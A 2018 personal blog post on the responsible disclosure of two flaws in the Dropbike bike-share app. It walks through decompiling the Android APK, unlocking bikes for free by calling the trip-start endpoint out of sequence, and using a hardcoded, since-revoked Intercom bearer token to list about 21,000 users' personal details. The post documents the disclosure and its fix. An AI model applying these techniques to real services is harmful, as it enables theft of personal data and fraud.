---
title: "Cracking Dropbike: Data Breach and Free Bike Rides"
date: 2018-09-19T16:24:45-07:00
image: /images/dropbike/dropbike.jpg
tags:
  - dropbike
  - security
  - react
  - android
---

*Edit 2018-09-20T15:42-07:00: [Dropbike's response to these issues](https://www.dropmobility.com/press/2018/9/20/customer-service-data-vulnerability-intercom-fixed)*

*Edit 2018-09-19T19:38-07:00: Updated support comments to more accurately
reflect their response.*

*Note: These issues were responsible disclosed and have since been fixed. This
is my understanding of the issues to the best of my knowledge.*

To give you a little bit of background, [Dropbike](https://www.dropbike.co/) is
a new bike sharing service that just launched at the University of British
Columbia as one of their first locations. They're only about a year old and
based out of Toronto. The service is pretty simple, they have a bunch of bikes
with a cell connection and bluetooth low energy locks spread out all over
campus. You can use their app to find nearby bikes and unlock them. Overall, it
seems like a neat convenient service and I was super excited to have them on
campus.

<!--more-->

{{% amp-img src="/images/dropbike/dropbike.jpg" %}}
A Dropbike in its natural habitat.
{{% /amp-img %}}

Unfortunately, the
[app](https://play.google.com/store/apps/details?id=ca.dropbike) is pretty
terrible. It's got a number of issues that don't seem like they should take very
long to fix, but they're still there which makes it frustrating to use.  The
finding and unlocking the bike part works for the most part, but once you unlock
a bike the app goes completely unresponsive, eats a huge amount of battery and
constantly polls and sends your location to the server.

{{% amp-img src="/images/dropbike/playstore.png" %}}
The first warning sign. [Google Play Store](https://play.google.com/store/apps/details?id=ca.dropbike)
{{% /amp-img %}}

I'd like to give them the benefit of the doubt as a small young company, but
it's hard to say they're unaware of the issues when their play store rating is a
1.8.

## opendropbike

As a software engineer, my first solution (though often misguided) is to write
my own app. Enter [opendropbike](https://expo.io/@d4l3k/opendropbike)--a
bare bones reimplementation of the official app in React Native with Expo.

The first step is reverse engineering their backend API. I download the APK for
the android app and decompress it using
[apktool](https://ibotpeaches.github.io/Apktool/).

```bash
$ apktool d Dropbike_v3.1.64.apk
$ cd Dropbike_v3.1.64
$ cat smali/ca/dropbike/MainActivity.smali
.class public Lca/dropbike/MainActivity;
.super Lcom/facebook/react/ReactActivity;
.source "MainActivity.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .line 5
    invoke-direct {p0}, Lcom/facebook/react/ReactActivity;-><init>()V

    return-void
.end method


# virtual methods
.method protected getMainComponentName()Ljava/lang/String;
    .locals 1

    const-string v0, "Dropbike"

    return-object v0
.end method
```

Looking at the main file it's pretty easy to see that it's using React Native
which means we can just format the `index.android.bundle` file using a linter.
Turns out [prettier](https://github.com/prettier/prettier) is the only formatter
that can handle 3MB files. All the eslint derivatives just run out of memory.

```bash
$ cp assets/index.android.bundle index.js
$ prettier index.js > dropbike.js
```

Digging through the formatted code is pretty easy. Most of the variable names
have been obsfucated, but enough remains it's not too hard to figure out. Turns
out the backend is just a simple Express app hosted on Heroku with a JSON over
HTTP api.

```javascript
// The main network call.
fetch("" + g + r, {
  method: s,
  body: n,
  headers: babelHelpers.extends({}, e, {
    "Content-Type": "application/json",
    Accept: "application/json",
    "x-dropbike-client-version": "3.1.64",
    "x-dropbike-client-type": o.Platform.OS
  })
})

// Example of one of the API calls.
getNearbyBikes: function(e) {
  var r,
    n,
    t = e.lat,
    u = e.lng;
  return regeneratorRuntime.async(
    function(e) {
      for (;;)
        switch ((e.prev = e.next)) {
          case 0:
            return (
              (r = // this is the key bit
                "/v3/bikes?" + s.default.stringify({ lat: t, lng: u })),
              (e.next = 3),
              regeneratorRuntime.awrap(d(r))
            );
          case 3:
            return (n = e.sent), e.abrupt("return", n);
          case 5:
          case "end":
            return e.stop();
        }
    },
    null,
    a
  );
},
```


You can see a short write up of the API methods and the formatted source code
[here](https://gist.github.com/d4l3k/d31c9c66c5e5585db56a313a1431c821). A
reimplemented API library can be found
[here](https://github.com/d4l3k/opendropbike/blob/master/api.js).

## First Issue: Free Bike Rides

{{% amp-img src="/images/dropbike/opendropbike.png" %}}
opendropbike in action.
{{% /amp-img %}}

Time to see if this app actually works! I walked outside to the bike I had
stashed outside my door, pulled out my app and scanned the QR code on the bike
to unlock.

Success! The lock popped open!

I look down at my phone and see a big red error.

```
Error: 500: Cannot read property 'id' of undefined
```

Well, that's kind of weird. I figured I had a bug somewhere in my app so I
pulled up the logs.

```javascript
-> POST /v3/start_trip Object {
  "lat": 49.2601817,
  "lng": -123.2382549,
  "plate": "905163",
  "scan_type": "qr",
} Object {
  "x-dropbike-session-id": "<omitted>",
}
<- POST /v3/start_trip Object {
  "message": "Cannot read property 'id' of undefined",
  "status_code": 500,
}
```

As far as I can tell, I'm making the exact same request as how the original app
does. There seems to be a bug on the server side. I pull up my list of current
trips only to find out that there's no trip logged nor have I been billed for
the trip.

```bash
$ curl -H 'x-dropbike-session-id: <omitted>' https://dropbike.herokuapp.com/v3/current_trips
[]
```

**You can unlock every single Dropbike remotely for free.**

{{% amp-img src="/images/dropbike/oops.gif" %}}
Oops.
{{% /amp-img %}}

I figure the only responsible thing to do is to reach out to Dropbike to see if
there's a bug bounty program and report the issue.

I later figure out that I wasn't properly making the proper call sequence of:
`/v3/preorder`, `/v3/ble_unlock`, `/v3/start_trip` and instead just directly
starting the trip which causes this bug.
It's pretty interesting that there's a large amount of fancy Bluetooth Low
Energy encrypted communications directly between your phone and the bike to
unlock it, but it turns out it's completely unnecessary since the backend API
can just unlock it remotely.

## Second Issue: Data Breach

I'm about to reach out to support via the built in app support chat when I
remember seeing something in the code about their support system. Dropbike uses
[Intercom](https://www.intercom.com/) to embed support conversations into
the app. I decide to poke around the source code a bit more.

*Note: these API keys are no longer active.*

```javascript
fetch("https://api.intercom.io/users?user_id=" + e, {
  method: "GET",
  headers: {
    Authorization:
      "Bearer dG9rOjZhNzk0NWI0X2JkNjZfNDVlMl9iNzMwX2VlOTEyMTMwYmY3MToxOjA=",
    Accept: "application/json"
  }
})
```

That's just part of their in app support right?

```bash
$ curl -H 'Authorization: Bearer dG9rOjZhNzk0NWI0X2JkNjZfNDVlMl9iNzMwX2VlOTEyMTMwYmY3MToxOjA=' -H 'Accept: application/json' https://api.intercom.io/users/
{
  "type": "user.list",
  "pages": {
    "type": "pages",
    "next": "https://api.intercom.io/users/?per_page=50&page=2",
    "page": 1,
    "per_page": 50,
    "total_pages": 437
  },
  "users": [
    ... # omitted for privacy
  ],
  "total_count": 21847,
  "limited": false
}
```

{{% amp-img src="/images/dropbike/supposed.gif" %}}
Uh...
{{% /amp-img %}}

Twenty thousand users seems like a lot. This is quite possibly every single one
of their users contact details.
I decide to try and see if I can find myself in it.

```ruby
[36] pry(main)> intercom.users.find(email: "rice@alumni.ubc.ca")
=> #<Intercom::User:0x0000556870a062b0
 @anonymous=false,
 @app_id="qo6ma54y",
 @avatar=
  #<Intercom::Avatar:0x0000556870a049b0
   @changed_fields=#<Set: {}>,
   @image_url=nil,
   @type="avatar">,
 @changed_fields=#<Set: {}>,
 @companies=[],
 @created_at=1536443054,
 @custom_attributes={},
 @email="rice@alumni.ubc.ca",
 @has_hard_bounced=false,
 @id="<omitted>",
 @last_request_at=1537311388,
 @last_seen_ip="<omitted>",
 @location_data=
  #<Intercom::LocationData:0x0000556870a03510
   @changed_fields=#<Set: {}>,
   @city_name="Vancouver",
   @continent_code="NA",
   @country_code="CAN",
   @country_name="Canada",
   @latitude=49.4635,
   @longitude=-122.822,
   @postal_code="V6T",
   @region_name="British Columbia",
   @timezone="America/Vancouver",
   @type="location_data">,
 @marked_email_as_spam=false,
 @name="Tristan Rice",
 @phone="<omitted>",
 @pseudonym=nil,
 @referrer=nil,
 @remote_created_at=1536442978,
 @segments=
  [#<Intercom::Segment:0x00005568709f7e90
    @changed_fields=#<Set: {}>,
    @id="593ae689a1d741f2ee6ef052",
    @type="segment">],
 @session_count=0,
 @signed_up_at=1536442978,
 @social_profiles=[],
 @tags=[],
 @type="user",
 @unsubscribed_from_emails=false,
 @updated_at=1537312236,
 @user_agent_data=nil,
 @user_id="<omitted>",
 @utm_campaign=nil,
 @utm_content=nil,
 @utm_medium=nil,
 @utm_source=nil,
 @utm_term=nil>
```

Yep. There I am. **Every single name, email, phone, location and IP addresses for
Dropbike's users is public.**

Just for good measure I check the account that this API key is under.

```ruby
[45] pry(main)> intercom.admins.me
=> #<Intercom::Admin:0x0000556870c47f60
  @app=
    #<Intercom::App:0x0000556870c45968
      @changed_fields=#<Set: {}>,
      @created_at=1497032327,
      @id_code="qo6ma54y",
      @identity_verification=false,
      @name="Drop",
      @secure=false,
      @timezone="America/Toronto",
      @type="app">,
  @avatar=
    #<Intercom::Avatar:0x0000556870c3ebe0
      @changed_fields=#<Set: {}>,
      @image_url="<omitted>",
      @type="avatar">,
  @changed_fields=#<Set: {}>,
  @email="<ceo's personal email>@gmail.com",
  @email_verified=true,
  @id="<omitted>",
  @name="Qiming Weng",
  @type="admin">
```

And... we get the CEO's personal gmail.

Dropbike has built the company side support directly into the app and **embedded
the production API keys** in along with it.

**It appears you can access all of the support messages as well, which might have
credit card details or other personal information.**

```javascript
fetch(
  "https://api.intercom.io/conversations?type=user&user_id=" +
    e +
    "&order=updated_at&sort=desc&display_as=plaintext",
  {
    headers: {
      Authorization:
        "Bearer dG9rOjZhNzk0NWI0X2JkNjZfNDVlMl9iNzMwX2VlOTEyMTMwYmY3MToxOjA=",
      Accept: "application/json",
      "Content-Type": "application/json"
    }
  }
)
```

However, I didn't test this method to protect the privacy of their users.

## Responsible Disclosure Timeline

To prevent further damage, I reached out to them the same day I found the
issues.

### Mon, Sep 17, 2018 at 03:20 PM

Initial message to their chat support asking about a bug bounty program and
asking to put me in touch with someone from engineering.

**No response.**

### Tue, Sep 18, 2018 at 03:12 PM

Sent a follow up message.

Support:

> Hey Tristan, thanks for reaching out to us about this. We really appreciate you telling us about this. We don't have a bug bounty scheme, but I've forwarded your feedback to our software team. Thanks again, Tristan.

Me:

> Okay great! They can reach out to me at rice@fn.lc for more details

Support:

> Thanks Tristan! We do have a bug reporting form which you could fill out with your concerns and comments: -omitted-

**Form had incorrect permissions set on it so I couldn't access it.**

### Tue, Sep 18, 2018 at 03:50 PM

Notified them about the permission issue.

Support:

> If you try to fill out the form now it should work Tristan. **If we feel that this is something we should pursue** we will follow up with you if need be. Thanks again, Tristan.

### Tue, Sep 18, 2018 at 05:27 PM

I send the basic details of the impact along via the bug reporting form and CC
the CEO. I was worried that this might just disappear into a black hole and I
wasn't happy that my personal details were leaked. I also notify them via the
email chain that I would be disclosing this in 30 days or whenever the issue was
fixed whichever is sooner.

Support forwards a request from the tech team to supply full details via the
Google form as they believed it was a secure channel.

### Tue, Sep 18, 2018 at 7:44 PM

I submit the full details via the bug reporting form.

The API key was revoked shortly after. I checked it several hours later and
it no longer worked.

### Wed, Sep 19, 2018 at 2:00 PM

I went out to check if the bike unlocking still worked, seems to be fixed. It
threw some weird errors and hid the bikes from the map, but it didn't unlock
them anymore.


## Recommendations

I'm not an expert in security and I wasn't even looking for security issues when
I found these. If I was able to do this, pretty sure any malicious attacker
could have as well with much more disastrous results.

Here's my recommendations:

* Hire a security professional to do a more formal review of Dropbike's systems
  to check for any other issues.
* Create a formal Bug Bounty program to encourage security researchers to find
  any new issues in the future.
* Add the bug reporting form into the app since there are tons of bugs with the
  app and Dropbike doesn't appear to pay any attention to the Google Play Store
  reviews.

## Other Thoughts: Personal Information Protection and Electronic Documents Act

I'm not an expert on Canadian law so if anyone else has some thoughts on it I'd
appreciate it and can add it here.

Canada does have laws requiring notifying users about data breaches such as
[PIPEDA](https://www.priv.gc.ca/en/privacy-topics/privacy-laws-in-canada/the-personal-information-protection-and-electronic-documents-act-pipeda/pipeda_brief/).

I'm not sure if an issue like this would require notifying users under it since
it's unclear whether anyone else actually managed to get a copy of the data.
The new laws only require notification if "real risk of significant harm" is
presented to the users. I'm not sure if just contact information falls under
that, nor what was contained in the support conversations.

If there is a real risk of significant harm, the government and all affected
users must be notified.

Unfortunately, most of these thoughts are only academic at the current time
since the law doesn't come into effect until November 1st, 2018.

[Full Text of Amendment](http://www.gazette.gc.ca/rp-pr/p2/2018/2018-04-18/html/sor-dors64-eng.html)

## See Also: Dropbike Visualizer

{{% amp-img src="/images/dropbike/visualizer.png" %}}
[My UBC Dropbike Trip Visualizer](https://d4l3k.github.io/dropbike-visualizer/)
{{% /amp-img %}}


